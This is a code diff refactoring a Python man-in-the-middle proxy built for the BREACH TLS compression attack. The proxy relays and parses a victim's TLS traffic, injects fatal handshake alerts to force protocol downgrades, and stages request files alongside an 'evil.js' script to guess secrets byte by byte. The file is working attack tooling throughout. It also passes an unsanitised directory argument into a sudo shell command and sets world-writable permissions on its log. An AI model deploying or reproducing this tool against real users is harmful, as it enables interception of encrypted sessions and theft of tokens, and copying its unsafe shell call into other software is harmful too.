@@ -1,25 +1,25 @@
 import socket
 import select
 import logging
-import constants
 import binascii
 from os import system
+import constants
+import hillclimbing
 
-# Logger setup
-#logging.basicConfig(filename="breach.log") # Log in file
-logging.basicConfig()
-logger = logging.getLogger(__name__)
-logger.setLevel(logging.ERROR)
-system("chmod 777 breach.log")
+def initialize():
+    # Initialize logger
+    global logger
+    #logging.basicConfig(filename="breach.log") # Log in file
+    logging.basicConfig()
+    logger = logging.getLogger(__name__)
+    logger.setLevel(logging.ERROR)
+    if logger.getEffectiveLevel() != logging.ERROR:
+        system("chmod 777 breach.log")
 
-# Counters for defragmentation
-past_bytes_user = 0 # Number of bytes expanding to future user packets
-past_bytes_endpoint = 0 # Number of bytes expanding to future endpoint packets
-chunked_user_header = None # TLS user header portion that gets stuck between packets
-chunked_endpoint_header = None # TLS endpoint header portion that gets stuck between packets
-
-# Print hexadecimal and ASCII representation of data
 def log_data(data):
+    '''
+    Print hexadecimal and ASCII representation of data
+    '''
     pad = 0
     output = []
     buff = "" # Buffer of 16 chars
@@ -38,8 +38,10 @@ def log_data(data):
 
     return "\n".join(output)
 
-# Parse data and print header information and payload
 def parse(data, past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, is_response = False):
+    '''
+    Parse data and print header information and payload.
+    '''
     lg = ["\n"]
     downgrade = False
 
@@ -152,8 +154,10 @@ def parse(data, past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, c
 
     return ("\n".join(lg), past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, downgrade)
 
-# Start sockets on user side (proxy as server) and endpoint side (proxy as client)
 def start():
+    '''
+    Start sockets on user side (proxy as server) and endpoint side (proxy as client).
+    '''
     logger.info("Starting Proxy")
 
     user_setup()
@@ -161,8 +165,10 @@ def start():
 
     logger.info("Proxy is set up")
 
-# Restart sockets in case of error
 def restart():
+    '''
+    Restart sockets in case of error.
+    '''
     logger.info("Restarting Proxy")
 
     try:
@@ -176,8 +182,10 @@ def restart():
 
     logger.info("Proxy has restarted")
 
-# Create and configure user side socket
 def user_setup():
+    '''
+    Create and configure user side socket.
+    '''
     global user_socket, user_connection, address
 
     logger.info("Setting up user socket")
@@ -190,8 +198,10 @@ def user_setup():
     user_connection, address = user_socket.accept()
     logger.info("User socket is set up")
 
-# Create and configure endpoint side socket
 def endpoint_setup():
+    '''
+    Create and configure endpoint side socket
+    '''
     global endpoint_socket
 
     logger.info("Setting up endpoint socket")
@@ -201,90 +211,126 @@ def endpoint_setup():
     endpoint_socket.setblocking(0) # Set non-blocking, i.e. raise exception if send/recv is not completed
     logger.info("Endpoint socket is set up")
 
-# Start proxy and execute main loop
-start()
-logger.info("Starting main proxy loop")
-while 1:
-    ready_to_read, ready_to_write, in_error = select.select(
-                                                            [user_connection, endpoint_socket],
-                                                            [],
-                                                            [],
-                                                            5
-                                                           )
+def execute_breach():
+    '''
+    Start proxy and execute main loop
+    '''
+    # Initialize counters for defragmentation
+    past_bytes_user = 0 # Number of bytes expanding to future user packets
+    past_bytes_endpoint = 0 # Number of bytes expanding to future endpoint packets
+    chunked_user_header = None # TLS user header portion that gets stuck between packets
+    chunked_endpoint_header = None # TLS endpoint header portion that gets stuck between packets
 
-    if user_connection in ready_to_read: # If user side socket is ready to read...
-            data = ""
+    start()
+    logger.info("Starting main proxy loop")
+    while 1:
+        ready_to_read, ready_to_write, in_error = select.select(
+                                                                [user_connection, endpoint_socket],
+                                                                [],
+                                                                [],
+                                                                5
+                                                               )
 
-            try:
-                data = user_connection.recv(constants.SOCKET_BUFFER) # ...receive data from user...
-            except Exception as exc:
-                logger.error("User connection error")
-                logger.error(exc)
-                restart()
+        if user_connection in ready_to_read: # If user side socket is ready to read...
+                data = ""
 
-            if len(data) == 0:
-                    logger.info("User connection closed")
+                try:
+                    data = user_connection.recv(constants.SOCKET_BUFFER) # ...receive data from user...
+                except Exception as exc:
+                    logger.error("User connection error")
+                    logger.error(exc)
                     restart()
-            else:
-                    print("User Packet Length: %d" % len(data))
-                    output, past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, downgrade = parse(
-                                                                                                                                 data,
-                                                                                                                                 past_bytes_endpoint,
-                                                                                                                                 past_bytes_user,
-                                                                                                                                 chunked_endpoint_header,
-                                                                                                                                 chunked_user_header
-                                                                                                                                ) # ...parse it...
-                    logger.debug(output)
-                    try:
-                        if downgrade and constants.ATTEMPT_DOWNGRADE:
-                                alert = 'HANDSHAKE_FAILURE'
-                                output, _, _, _, _, _ = parse(
-                                                              constants.ALERT_MESSAGES[alert],
-                                                              past_bytes_endpoint,
-                                                              past_bytes_user,
-                                                              True
-                                                             )
-                                logger.debug("\n\n" + "Downgrade Attempt" + output)
-                                user_connection.sendall(constants.ALERT_MESSAGES[alert]) # if we are trying to downgrade, send fatal alert to user
-                                continue
-                        endpoint_socket.sendall(data) # ...and send it to endpoint
-                    except Exception as exc:
-                        logger.error("User data forwarding error")
-                        logger.error(exc)
+
+                if len(data) == 0:
+                        logger.info("User connection closed")
                         restart()
+                else:
+                        print("User Packet Length: %d" % len(data))
+                        output, past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, downgrade = parse(
+                                                                                                                                     data,
+                                                                                                                                     past_bytes_endpoint,
+                                                                                                                                     past_bytes_user,
+                                                                                                                                     chunked_endpoint_header,
+                                                                                                                                     chunked_user_header
+                                                                                                                                    ) # ...parse it...
+                        logger.debug(output)
+                        try:
+                            if downgrade and constants.ATTEMPT_DOWNGRADE:
+                                    alert = 'HANDSHAKE_FAILURE'
+                                    output, _, _, _, _, _ = parse(
+                                                                  constants.ALERT_MESSAGES[alert],
+                                                                  past_bytes_endpoint,
+                                                                  past_bytes_user,
+                                                                  True
+                                                                 )
+                                    logger.debug("\n\n" + "Downgrade Attempt" + output)
+                                    user_connection.sendall(constants.ALERT_MESSAGES[alert]) # if we are trying to downgrade, send fatal alert to user
+                                    continue
+                            endpoint_socket.sendall(data) # ...and send it to endpoint
+                        except Exception as exc:
+                            logger.error("User data forwarding error")
+                            logger.error(exc)
+                            restart()
 
-    if endpoint_socket in ready_to_read: # Same for the endpoint side
-            data = ""
+        if endpoint_socket in ready_to_read: # Same for the endpoint side
+                data = ""
 
-            try:
-                data = endpoint_socket.recv(constants.SOCKET_BUFFER)
-            except Exception as exc:
-                logger.error("Endpoint connection error")
-                logger.error(exc)
-                restart()
-
-            if len(data) == 0:
-                    logger.info("Endpoint connection closed")
+                try:
+                    data = endpoint_socket.recv(constants.SOCKET_BUFFER)
+                except Exception as exc:
+                    logger.error("Endpoint connection error")
+                    logger.error(exc)
                     restart()
-            else:
-                    print("Endpoint Packet Length: %d" % len(data))
-                    output, past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, _ = parse(
-                                                                                                                          data,
-                                                                                                                          past_bytes_endpoint,
-                                                                                                                          past_bytes_user,
-                                                                                                                          chunked_endpoint_header,
-                                                                                                                          chunked_user_header,
-                                                                                                                          True
-                                                                                                                         )
-                    logger.debug(output)
-                    try:
-                        user_connection.sendall(data)
-                    except Exception as exc:
-                        logger.error("Endpoint data forwarding error")
-                        logger.error(exc)
-                        restart()
 
-# Close sockets to terminate connection
-user_connection.close()
-endpoint_socket.close()
-logger.info("Connection closed")
+                if len(data) == 0:
+                        logger.info("Endpoint connection closed")
+                        restart()
+                else:
+                        print("Endpoint Packet Length: %d" % len(data))
+                        output, past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, _ = parse(
+                                                                                                                              data,
+                                                                                                                              past_bytes_endpoint,
+                                                                                                                              past_bytes_user,
+                                                                                                                              chunked_endpoint_header,
+                                                                                                                              chunked_user_header,
+                                                                                                                              True
+                                                                                                                             )
+                        logger.debug(output)
+                        try:
+                            user_connection.sendall(data)
+                        except Exception as exc:
+                            logger.error("Endpoint data forwarding error")
+                            logger.error(exc)
+                            restart()
+
+    # Close sockets to terminate connection
+    user_connection.close()
+    endpoint_socket.close()
+    logger.info("Connection closed")
+
+def parse_args():
+    '''
+    Parse console arguments for standalone use.
+    '''
+    parser = argparse.ArgumentParser(description='Create hillclimbing parameters file')
+    parser.add_argument('-a', metavar = 'alphabet', required = True, nargs = '+', help = 'Choose alphabet type (careful to use correct request order): n => digits, l => lowercase letters, u => uppercase letters, d => - and _')
+    parser.add_argument('-p', '--prefix', metavar = 'bootstrap_prefix', required = True, help = 'Input the already known prefix needed for bootstrap')
+    parser.add_argument('--wdir', metavar = 'web_application_directory', help = 'The directory where you have added evil.js')
+    args = parser.parse_args()
+    alpha_types = args.a
+    prefix = args.prefix
+    if args.wdir:
+        wdir = args.wdir
+    else:
+        wdir = '/var/www/breach'
+    return alpha_types, prefix, wdir
+
+if __name__ == "__main__":
+    import argparse
+
+    initialize()
+    alpha_types, prefix, wdir = parse_args()
+    hillclimbing.create_request_file(alpha_types, prefix)
+    system("sudo cp request.txt " + wdir)
+    logger.info("Hillclimbing parameters file created")
+    execute_breach()
